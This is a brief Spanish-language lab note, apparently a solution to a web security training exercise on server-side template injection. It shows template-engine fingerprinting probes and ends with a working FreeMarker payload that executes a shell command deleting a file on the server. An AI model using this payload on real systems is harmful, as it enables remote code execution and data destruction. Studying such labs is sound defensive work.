Tenemos que detectar ante que sistema de plantillas estamos

![[Pasted image 20250118205450.png]]

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

Usamos la wordlist de PayloadAllTheThings para detectar que sistema de plantillas se está usando, lo pasamos al intruder : 

![[Pasted image 20250118210449.png]]

El payload `#{3*3}` funciona, podría ser Slim o Haml (ruby)
El payload `${7*7}` también.


Es freemarker : 

![[Pasted image 20250118211852.png]]



```java
${"freemarker.template.utility.Execute"?new()("rm+/home/carlos/morale.txt")}
```

